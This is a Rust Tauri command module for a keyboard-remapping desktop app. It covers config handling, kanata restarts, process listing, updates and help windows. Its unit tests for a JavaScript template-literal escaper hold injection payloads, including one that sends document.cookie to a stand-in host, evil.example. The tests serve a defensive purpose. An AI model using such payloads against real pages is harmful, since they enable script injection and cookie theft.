use muhenkan_switch_config::{self as config, Config};
use serde::Serialize;
use std::path::PathBuf;
use tauri::State;

use crate::kanata::KanataManager;

// ── Config commands ──

fn resolve_config_path() -> PathBuf {
    config::config_path().unwrap_or_else(|| {
        // Default: exe dir / config.toml
        std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.join("config.toml")))
            .unwrap_or_else(|| PathBuf::from("config.toml"))
    })
}

#[tauri::command]
pub fn get_config() -> Result<Config, String> {
    config::load().map_err(|e| e.to_string())
}

#[tauri::command]
pub fn generate_keyboard_svg() -> Result<String, String> {
    let cfg = config::load().map_err(|e| e.to_string())?;
    Ok(config::svg::generate(&cfg))
}

/// kbd ファイルの句読点を config に合わせて書き換え、kanata を再起動する。
///
/// `save_config` と `import_config` の両方で「config 保存後」に必要となる後処理であり、
/// ここに集約する。kbd 書き換えと kanata の停止 (stop) の失敗は、外部ツール呼び出し失敗
/// に対する既存の温度感 (警告して続行) に合わせて無視するが、kanata の起動 (start) の
/// 失敗はキー割当が止まったままユーザーに伝わらなくなるため、握り潰さず呼び出し元に
/// エラーとして伝搬する。
fn rewrite_punctuation_and_restart_kanata(config: &Config, manager: &KanataManager) -> Result<(), String> {
    if let Ok(kbd_path) = KanataManager::resolve_kbd_path() {
        if let Err(e) = config::rewrite_kbd_punctuation(&kbd_path, &config.punctuation_style) {
            eprintln!("[config] kbd ファイルの句読点書き換えに失敗しました: {e:#}");
        }
    }
    if let Err(e) = manager.stop() {
        eprintln!("[kanata] 再起動前の停止に失敗しました: {e:#}");
    }
    manager.start().map_err(|e| format!("{e:#}"))
}

#[tauri::command]
pub fn save_config(app: tauri::AppHandle, config: Config, manager: State<KanataManager>) -> Result<(), String> {
    use tauri::Emitter;
    let errors = config::validate(&config);
    if !errors.is_empty() {
        return Err(errors.join("\n"));
    }
    let path = resolve_config_path();
    config::save(&path, &config).map_err(|e| e.to_string())?;

    // kbd ファイルの句読点を書き換え → kanata 再起動。
    // config-saved イベントは config の保存自体が成功していれば (kanata 再起動の
    // 成否に関わらず) 従来どおり emit する (ヘルプウィンドウの SVG プレビュー自動更新用)。
    let restart_result = rewrite_punctuation_and_restart_kanata(&config, &manager);

    let _ = app.emit("config-saved", ());

    restart_result
}

#[tauri::command]
pub fn reset_config() -> Result<Config, String> {
    config::load().map_err(|e| e.to_string())
}

#[tauri::command]
pub fn default_config() -> Config {
    config::default_config()
}

#[tauri::command]
pub async fn export_config(app: tauri::AppHandle) -> Result<bool, String> {
    use tauri_plugin_dialog::DialogExt;
    let src = resolve_config_path();
    let (tx, rx) = std::sync::mpsc::channel();
    let default_dir = dirs::desktop_dir()
        .or_else(dirs::download_dir)
        .or_else(dirs::home_dir);
    let mut builder = app.dialog().file().add_filter("TOML", &["toml"]).set_file_name("muhenkan-switch-config.toml");
    if let Some(dir) = default_dir {
        builder = builder.set_directory(dir);
    }
    builder.save_file(move |path| {
            let _ = tx.send(path.map(|p| p.as_path().unwrap().to_path_buf()));
        });
    let dest = rx.recv().map_err(|e| e.to_string())?;
    match dest {
        Some(dest) => {
            std::fs::copy(&src, &dest).map_err(|e| e.to_string())?;
            Ok(true)
        }
        None => Ok(false),
    }
}

#[tauri::command]
pub async fn import_config(app: tauri::AppHandle, manager: State<'_, KanataManager>) -> Result<Option<Config>, String> {
    use tauri_plugin_dialog::DialogExt;
    let (tx, rx) = std::sync::mpsc::channel();
    app.dialog()
        .file()
        .add_filter("TOML", &["toml"])
        .pick_file(move |path| {
            let _ = tx.send(path.map(|p| p.as_path().unwrap().to_path_buf()));
        });
    let selected = rx.recv().map_err(|e| e.to_string())?;
    match selected {
        Some(src) => {
            let imported = config::load_from(&src).map_err(|e| e.to_string())?;
            let errors = config::validate(&imported);
            if !errors.is_empty() {
                return Err(errors.join("\n"));
            }
            let dest = resolve_config_path();
            config::save(&dest, &imported).map_err(|e| e.to_string())?;

            // save_config と同様に kbd の句読点を反映して kanata を再起動する。
            rewrite_punctuation_and_restart_kanata(&imported, &manager)?;

            Ok(Some(imported))
        }
        None => Ok(None),
    }
}

// ── App presets ──

/// コンパイル時に埋め込んだ app-presets.json から現在の OS 用プリセットを返す。
#[tauri::command]
pub fn get_app_presets() -> Result<serde_json::Value, String> {
    const PRESETS_JSON: &str = include_str!("../../config/app-presets.json");
    let all: serde_json::Value =
        serde_json::from_str(PRESETS_JSON).map_err(|e| e.to_string())?;
    let os_key = match std::env::consts::OS {
        "windows" => "windows",
        "macos" => "macos",
        _ => "linux",
    };
    Ok(all.get(os_key).cloned().unwrap_or(serde_json::Value::Object(Default::default())))
}

// ── Search presets ──

/// コンパイル時に埋め込んだ search-presets.json を返す（OS 非依存）。
#[tauri::command]
pub fn get_search_presets() -> Result<serde_json::Value, String> {
    const PRESETS_JSON: &str = include_str!("../../config/search-presets.json");
    serde_json::from_str(PRESETS_JSON).map_err(|e| e.to_string())
}

// ── Kanata commands ──

#[derive(Serialize, Clone)]
pub struct KanataStatus {
    pub running: bool,
    pub pid: Option<u32>,
}

#[tauri::command]
pub fn get_kanata_status(manager: State<KanataManager>) -> KanataStatus {
    let (running, pid) = manager.status();
    KanataStatus { running, pid }
}

#[tauri::command]
pub fn start_kanata(manager: State<KanataManager>) -> Result<(), String> {
    manager.start().map_err(|e| format!("{:#}", e))
}

#[tauri::command]
pub fn stop_kanata(manager: State<KanataManager>) -> Result<(), String> {
    manager.stop().map_err(|e| format!("{:#}", e))
}

// ── Process list (for app selection) ──

#[derive(Serialize)]
pub struct ProcessInfo {
    pub name: String,
    pub pid: u32,
}

#[tauri::command]
pub fn get_running_processes() -> Result<Vec<ProcessInfo>, String> {
    imp::get_processes_impl().map_err(|e| e.to_string())
}

// ── Platform: Windows ──

#[cfg(target_os = "windows")]
mod imp {
    use super::ProcessInfo;
    use std::collections::HashSet;
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    pub(super) fn get_processes_impl() -> anyhow::Result<Vec<ProcessInfo>> {
        let mut processes = Vec::new();
        let mut seen = HashSet::new();

        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
                .map_err(|e| anyhow::anyhow!("プロセス一覧のスナップショット取得に失敗しました: {}", e))?;
            let mut entry = PROCESSENTRY32W {
                dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
                ..Default::default()
            };

            if Process32FirstW(snapshot, &mut entry).is_ok() {
                loop {
                    let exe_len = entry
                        .szExeFile
                        .iter()
                        .position(|&c| c == 0)
                        .unwrap_or(entry.szExeFile.len());
                    let name = OsString::from_wide(&entry.szExeFile[..exe_len])
                        .to_string_lossy()
                        .to_string();

                    if !seen.contains(&name) {
                        seen.insert(name.clone());
                        processes.push(ProcessInfo {
                            name,
                            pid: entry.th32ProcessID,
                        });
                    }

                    if Process32NextW(snapshot, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = windows::Win32::Foundation::CloseHandle(snapshot);
        }

        processes.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
        Ok(processes)
    }
}

// ── Platform: Linux ──

#[cfg(target_os = "linux")]
mod imp {
    use super::ProcessInfo;

    pub(super) fn get_processes_impl() -> anyhow::Result<Vec<ProcessInfo>> {
        ps_processes()
    }

    fn ps_processes() -> anyhow::Result<Vec<ProcessInfo>> {
        let output = std::process::Command::new("ps")
            .args(["-eo", "pid,comm"])
            .output()?;
        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut processes = Vec::new();
        let mut seen = std::collections::HashSet::new();

        for line in stdout.lines().skip(1) {
            let parts: Vec<&str> = line.trim().splitn(2, char::is_whitespace).collect();
            if parts.len() == 2 {
                let pid: u32 = parts[0].trim().parse().unwrap_or(0);
                let name = parts[1].trim().to_string();
                if !seen.contains(&name) {
                    seen.insert(name.clone());
                    processes.push(ProcessInfo { name, pid });
                }
            }
        }

        processes.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
        Ok(processes)
    }
}

// ── Platform: macOS ──

#[cfg(target_os = "macos")]
mod imp {
    use super::ProcessInfo;

    pub(super) fn get_processes_impl() -> anyhow::Result<Vec<ProcessInfo>> {
        ps_processes()
    }

    fn ps_processes() -> anyhow::Result<Vec<ProcessInfo>> {
        let output = std::process::Command::new("ps")
            .args(["-eo", "pid,comm"])
            .output()?;
        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut processes = Vec::new();
        let mut seen = std::collections::HashSet::new();

        for line in stdout.lines().skip(1) {
            let parts: Vec<&str> = line.trim().splitn(2, char::is_whitespace).collect();
            if parts.len() == 2 {
                let pid: u32 = parts[0].trim().parse().unwrap_or(0);
                let name = parts[1].trim().to_string();
                if !seen.contains(&name) {
                    seen.insert(name.clone());
                    processes.push(ProcessInfo { name, pid });
                }
            }
        }

        processes.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
        Ok(processes)
    }
}

// ── Updater ──

#[derive(Serialize)]
pub struct UpdateInfo {
    pub version: String,
    pub body: Option<String>,
}

#[tauri::command]
pub async fn check_update(app: tauri::AppHandle) -> Result<Option<UpdateInfo>, String> {
    // spawn で隔離し、updater 内部の panic でアプリが落ちるのを防ぐ
    tauri::async_runtime::spawn(async move {
        use tauri_plugin_updater::UpdaterExt;
        let update = app
            .updater()
            .map_err(|e| format!("{:#}", e))?
            .check()
            .await
            .map_err(|e| format!("{:#}", e))?;
        match update {
            Some(u) => Ok(Some(UpdateInfo {
                version: u.version.clone(),
                body: u.body.clone(),
            })),
            None => Ok(None),
        }
    })
    .await
    .unwrap_or_else(|e| Err(format!("アップデート確認中にエラーが発生しました: {}", e)))
}

#[tauri::command]
pub async fn install_update(app: tauri::AppHandle) -> Result<(), String> {
    tauri::async_runtime::spawn(async move {
        use tauri_plugin_updater::UpdaterExt;
        let update = app
            .updater()
            .map_err(|e| format!("{:#}", e))?
            .check()
            .await
            .map_err(|e| format!("{:#}", e))?
            .ok_or("アップデートが見つかりません".to_string())?;
        update
            .download_and_install(|_, _| {}, || {})
            .await
            .map_err(|e| format!("{:#}", e))
    })
    .await
    .unwrap_or_else(|e| Err(format!("アップデートインストール中にエラーが発生しました: {}", e)))
}

// ── Autostart ──

#[tauri::command]
pub fn get_autostart_enabled(app: tauri::AppHandle) -> Result<bool, String> {
    use tauri_plugin_autostart::ManagerExt;
    app.autolaunch()
        .is_enabled()
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub fn set_autostart_enabled(app: tauri::AppHandle, enabled: bool) -> Result<(), String> {
    use tauri_plugin_autostart::ManagerExt;
    let autostart = app.autolaunch();
    if enabled {
        autostart.enable().map_err(|e| e.to_string())
    } else {
        autostart.disable().map_err(|e| e.to_string())
    }
}

// ── Install type detection ──

/// Returns true if this is an installer install (Windows always uses NSIS).
pub fn is_nsis_install() -> bool {
    cfg!(target_os = "windows")
}

#[tauri::command]
pub fn get_install_type() -> String {
    if is_nsis_install() {
        "installer".to_string()
    } else {
        "script".to_string()
    }
}

/// Linux/macOS でターミナルを開いて update スクリプトを実行する。
/// Windows では tauri-plugin-updater を使うため、呼ばれることはない想定。
#[tauri::command]
pub fn spawn_update_terminal() -> Result<(), String> {
    use std::process::Command;

    #[cfg(target_os = "linux")]
    {
        let home = dirs::home_dir().ok_or_else(|| "ホームディレクトリが見つかりません".to_string())?;
        let script = home.join(".local/share/muhenkan-switch/update.sh");
        if !script.exists() {
            return Err(format!(
                "update.sh が見つかりません: {}",
                script.display()
            ));
        }
        // GUI 自身が nohup 等で stdin=/dev/null で起動されていると、spawn された
        // ターミナル内 bash の stdin も /dev/null を継承し、末尾の `read` が即 EOF
        // を踏んでターミナルが早期に閉じることがある。`</dev/tty` で controlling
        // terminal (= ターミナルエミュレータの PTY) から確実に読むようにする。
        let bash_cmd = format!(
            "{}; echo; echo 'Press Enter to close...'; read _ </dev/tty || true",
            script.display()
        );

        // $TERMINAL → x-terminal-emulator → 主要候補の順に試行
        let mut candidates: Vec<(String, Vec<&str>)> = Vec::new();
        if let Ok(term) = std::env::var("TERMINAL") {
            candidates.push((term, vec!["-e", "bash", "-c"]));
        }
        candidates.push(("x-terminal-emulator".to_string(), vec!["-e", "bash", "-c"]));
        candidates.push(("gnome-terminal".to_string(), vec!["--", "bash", "-c"]));
        candidates.push(("konsole".to_string(), vec!["-e", "bash", "-c"]));
        candidates.push(("xterm".to_string(), vec!["-e", "bash", "-c"]));

        for (term, args) in &candidates {
            let mut cmd = Command::new(term);
            for a in args {
                cmd.arg(a);
            }
            cmd.arg(&bash_cmd);
            if cmd.spawn().is_ok() {
                return Ok(());
            }
        }
        Err("ターミナルエミュレータが見つかりません (TERMINAL/x-terminal-emulator/gnome-terminal/konsole/xterm をインストールしてください)".to_string())
    }

    #[cfg(target_os = "macos")]
    {
        let home = dirs::home_dir().ok_or_else(|| "ホームディレクトリが見つかりません".to_string())?;
        let script = home.join("Library/Application Support/muhenkan-switch/update-macos.sh");
        if !script.exists() {
            return Err(format!(
                "update-macos.sh が見つかりません: {}",
                script.display()
            ));
        }
        Command::new("open")
            .arg("-a")
            .arg("Terminal.app")
            .arg(&script)
            .spawn()
            .map_err(|e| format!("Terminal.app の起動に失敗しました: {}", e))?;
        Ok(())
    }

    #[cfg(not(any(target_os = "linux", target_os = "macos")))]
    {
        Err("このプラットフォームではサポートされていません".to_string())
    }
}

// ── Utility commands ──

#[tauri::command]
pub async fn browse_folder(app: tauri::AppHandle) -> Result<Option<String>, String> {
    use tauri_plugin_dialog::DialogExt;
    let (tx, rx) = std::sync::mpsc::channel();
    app.dialog().file().pick_folder(move |path| {
        let _ = tx.send(path.map(|p| p.to_string()));
    });
    rx.recv()
        .map_err(|e| e.to_string())
}

#[tauri::command]
pub fn get_config_path() -> String {
    resolve_config_path().display().to_string()
}

#[tauri::command]
pub fn get_app_version(app: tauri::AppHandle) -> String {
    app.package_info().version.to_string()
}

#[tauri::command]
pub fn quit_app(app: tauri::AppHandle, manager: State<KanataManager>) {
    let _ = manager.stop();
    app.exit(0);
}

#[tauri::command]
pub fn open_install_dir() -> Result<(), String> {
    let dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .ok_or_else(|| "インストール先のフォルダが見つかりません".to_string())?;
    open::that(&dir).map_err(|e| e.to_string())
}

#[tauri::command]
pub fn open_config_in_editor() -> Result<(), String> {
    let path = resolve_config_path();
    open::that(&path).map_err(|e| e.to_string())
}

#[tauri::command]
pub fn open_help_window(app: tauri::AppHandle) -> Result<(), String> {
    use tauri::Manager;
    if let Some(win) = app.get_webview_window("help") {
        let _ = win.set_focus();
        return Ok(());
    }
    // Window creation dispatches to the main thread via run_on_main_thread().
    // Spawn a thread so the invoke() returns immediately and IPC stays responsive.
    let install_type = get_install_type();
    std::thread::spawn(move || {
        use tauri::{WebviewUrl, WebviewWindowBuilder};
        let url = format!("help.html?install={}", install_type);
        let _ = WebviewWindowBuilder::new(&app, "help", WebviewUrl::App(url.into()))
            .title("使い方 — muhenkan-switch")
            .inner_size(850.0, 600.0)
            .resizable(true)
            .center()
            .build();
    });
    Ok(())
}

/// JS テンプレートリテラル (`` `...` ``) に安全に埋め込めるよう文字列をエスケープする。
///
/// `\` を最初にエスケープしてから `` ` `` と `$` をエスケープすることで、
/// バックスラッシュエスケープより後段の置換で挿入される `\` (`` \` `` / `\$`) が
/// 二重エスケープされてしまう事故を避けている。
fn escape_for_js_template_literal(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('`', "\\`")
        .replace('$', "\\$")
}

#[tauri::command]
pub fn open_keyboard_window(app: tauri::AppHandle) -> Result<(), String> {
    use tauri::Manager;
    if let Some(win) = app.get_webview_window("keyboard") {
        let _ = win.set_focus();
        return Ok(());
    }
    let cfg = config::load().map_err(|e| e.to_string())?;
    let svg = config::svg::generate(&cfg);
    std::thread::spawn(move || {
        use tauri::{WebviewUrl, WebviewWindowBuilder};
        let html = format!(
            r##"<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<style>
body {{ margin:0; background:#1e1e2e; overflow:hidden; width:100vw; height:100vh; cursor:grab; user-select:none; }}
body.dragging {{ cursor:grabbing; }}
#wrap {{ transform-origin:0 0; padding:20px; display:inline-block; }}
</style></head>
<body>
<div id="wrap">{svg}</div>
<script>
let scale = 1, tx = 0, ty = 0;
const wrap = document.getElementById("wrap");
function apply() {{
  wrap.style.transform = "translate(" + tx + "px," + ty + "px) scale(" + scale + ")";
}}
// ホイールでズーム（Ctrl 不要）
document.addEventListener("wheel", e => {{
  e.preventDefault();
  const old = scale;
  scale = Math.min(5, Math.max(0.3, scale * (e.deltaY < 0 ? 1.1 : 0.9)));
  // マウス位置を中心にズーム
  const r = scale / old;
  tx = e.clientX - r * (e.clientX - tx);
  ty = e.clientY - r * (e.clientY - ty);
  apply();
}}, {{ passive: false }});
// ドラッグで移動
let dragging = false, sx = 0, sy = 0;
document.addEventListener("mousedown", e => {{
  if (e.button === 0) {{ dragging = true; sx = e.clientX - tx; sy = e.clientY - ty; document.body.classList.add("dragging"); }}
}});
document.addEventListener("mousemove", e => {{
  if (dragging) {{ tx = e.clientX - sx; ty = e.clientY - sy; apply(); }}
}});
document.addEventListener("mouseup", () => {{
  dragging = false; document.body.classList.remove("dragging");
}});
// Ctrl+0 でリセット
document.addEventListener("keydown", e => {{
  if (e.ctrlKey && e.key === "0") {{ e.preventDefault(); scale = 1; tx = 0; ty = 0; apply(); }}
}});
</script>
</body></html>"##
        );
        let url = WebviewUrl::App("about:blank".into());
        if let Ok(win) = WebviewWindowBuilder::new(&app, "keyboard", url)
            .title("キーボード配列 — muhenkan-switch")
            .inner_size(800.0, 340.0)
            .resizable(true)
            .center()
            .build()
        {
            // HTML を直接評価して表示
            let escaped = escape_for_js_template_literal(&html);
            let _ = win.eval(&format!("document.open();document.write(`{escaped}`);document.close();"));
        }
    });
    Ok(())
}

#[tauri::command]
pub fn validate_timestamp_format(
    format: String,
    delimiter: String,
    position: String,
) -> Result<String, String> {
    if format.is_empty() {
        return Err("フォーマットを入力してください".to_string());
    }
    let now = chrono::Local::now();
    use std::fmt::Write;
    let mut ts = String::new();
    write!(ts, "{}", now.format(&format))
        .map_err(|_| "無効なフォーマット文字列です".to_string())?;
    let (stem, ext) = ("FileName", ".txt");
    let preview = if position == "after" {
        format!("{}{}{}{}", stem, delimiter, ts, ext)
    } else {
        format!("{}{}{}{}", ts, delimiter, stem, ext)
    };
    Ok(preview)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// JS テンプレートリテラルの字句解析を簡易的に模倣し、エスケープされていない
    /// バッククォート (リテラル終端) や `${` (式展開の開始) が含まれていないかを判定する。
    /// `\` から始まる 2 文字は正当なエスケープシーケンスとして読み飛ばす。
    fn has_unescaped_terminator_or_expr(escaped: &str) -> bool {
        let chars: Vec<char> = escaped.chars().collect();
        let mut i = 0;
        while i < chars.len() {
            match chars[i] {
                '\\' => i += 2, // エスケープシーケンス（次の 1 文字ごと消費）
                '`' => return true,
                '$' if chars.get(i + 1) == Some(&'{') => return true,
                _ => i += 1,
            }
        }
        false
    }

    #[test]
    fn escape_for_js_template_literal_dollar_brace_injection() {
        // ${alert(1)} のような JS 注入ペイロードが式展開として解釈されないこと
        let input = "${alert(1)}";
        let escaped = escape_for_js_template_literal(input);
        assert_eq!(escaped, "\\${alert(1)}");
        assert!(!has_unescaped_terminator_or_expr(&escaped));
    }

    #[test]
    fn escape_for_js_template_literal_backtick_injection() {
        // バッククォートによるテンプレートリテラルの早期終端を防ぐ
        let input = "`;alert(1);`";
        let escaped = escape_for_js_template_literal(input);
        assert_eq!(escaped, "\\`;alert(1);\\`");
        assert!(!has_unescaped_terminator_or_expr(&escaped));
    }

    #[test]
    fn escape_for_js_template_literal_backslash_first_order() {
        // バックスラッシュを最初にエスケープしないと、後段の `\`` / `\$` が
        // 二重エスケープされて壊れてしまう。入力に `\$` を含めて順序を検証する。
        let input = "\\$";
        let escaped = escape_for_js_template_literal(input);
        // 期待: `\` -> `\\`、`$` -> `\$` の順で適用され `\\\$` になる
        assert_eq!(escaped, "\\\\\\$");
        assert!(!has_unescaped_terminator_or_expr(&escaped));
    }

    #[test]
    fn escape_for_js_template_literal_combined_payload() {
        // 実際の攻撃ベクタに近い、SVG の title 等に混入しうる複合ペイロード
        let input = "</title>${fetch('https://evil.example/'+document.cookie)}<title>";
        let escaped = escape_for_js_template_literal(input);
        assert!(!has_unescaped_terminator_or_expr(&escaped));
    }

    #[test]
    fn escape_for_js_template_literal_plain_text_unchanged() {
        let input = "普通の設定名 (no special chars)";
        assert_eq!(escape_for_js_template_literal(input), input);
        assert!(!has_unescaped_terminator_or_expr(input));
    }
}
